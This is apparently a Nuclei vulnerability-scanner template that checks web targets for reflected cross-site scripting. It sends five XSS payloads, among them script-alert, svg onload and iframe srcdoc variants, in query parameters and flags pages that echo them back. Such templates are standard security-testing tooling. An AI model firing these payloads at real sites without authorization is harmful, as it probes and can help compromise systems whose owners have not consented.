id: THENAWABX_FOUND_XSS
info:
  name: ⚡ Nawab-Confirmed-XSS ⚡
  author: thenawabx
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}?q=<video><source/onerror=confirm(1)>"
      - "{{BaseURL}}?id=<body/onpageshow=alert?.(1)>"
      - "{{BaseURL}}?search=<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
      - "{{BaseURL}}?name=<script>alert(\"Hacked\")</script>"
      - "{{BaseURL}}?msg=<ScRipt>alert(\"Hacked\")</ScRipt>"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "<video><source/onerror=confirm(1)>"
          - "<body/onpageshow=alert?.(1)>"
          - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
          - "<script>alert(\"Hacked\")</script>"
          - "<ScRipt>alert(\"Hacked\")</ScRipt>"
        condition: or

      - type: word
        part: header
        words:
          - "text/html"

      - type: word
        part: body
        negative: true
        words:
          - "example"
          - "tutorial"
          - "W3Schools"
          - "placeholder"

    extractors:
      - type: regex
        part: body
        regex:
          - "(?i)<script>alert.*?</script>"
          - "(?i)<video><source/onerror=.*?>"
